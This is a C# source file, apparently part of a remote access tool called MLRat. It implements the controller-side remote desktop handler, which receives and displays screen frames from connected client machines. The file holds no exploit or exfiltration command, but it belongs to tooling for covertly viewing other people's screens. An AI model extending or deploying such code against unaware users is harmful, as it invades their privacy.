using MLRat.Server;
using MLSurveillanceServer.Forms;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLSurveillanceServer.Handlers
{
    public static class RemoteDesktopHandler
    {
        private static Dictionary<Guid, RemoteDesktopForm> formHandler = new Dictionary<Guid, RemoteDesktopForm>();
        public static void ContextCallback(IClient[] clients)
        {
            foreach (var c in clients)
                Start(c);
        }

        private static void Start(IClient client)
        {
            if (formHandler[client.ID] == null)
            {
                var form = new RemoteDesktopForm(client);
                form.FormClosed += Form_FormClosed;
                formHandler[client.ID] = form;
                form.Show();
            }
        }

        public static void Disconnect(IClient client)
        {
            if(formHandler.ContainsKey(client.ID))
            {
                formHandler[client.ID].Destroy();
                formHandler.Remove(client.ID);
            }
        }

        public static void Handle(IClient client, object[] data)
        {
            var command = (RemoteDesktopCommand)data[1];
            if (command != RemoteDesktopCommand.Frame)
                return;
            if(formHandler.ContainsKey(client.ID) && formHandler[client.ID] != null)
            {
                using(var ms = new MemoryStream((byte[])data[2]))
                formHandler[client.ID].SetImage(Image.FromStream(ms));
            }
        }

        private static void Form_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            var form = (RemoteDesktopForm)sender;
            formHandler[form.Client.ID] = null;
            form.Destroy();
        }

        public static void NewClient(IClient client)
        {
            if(!formHandler.ContainsKey(client.ID))
            {
                formHandler.Add(client.ID, null);
            }
        }
    }
}
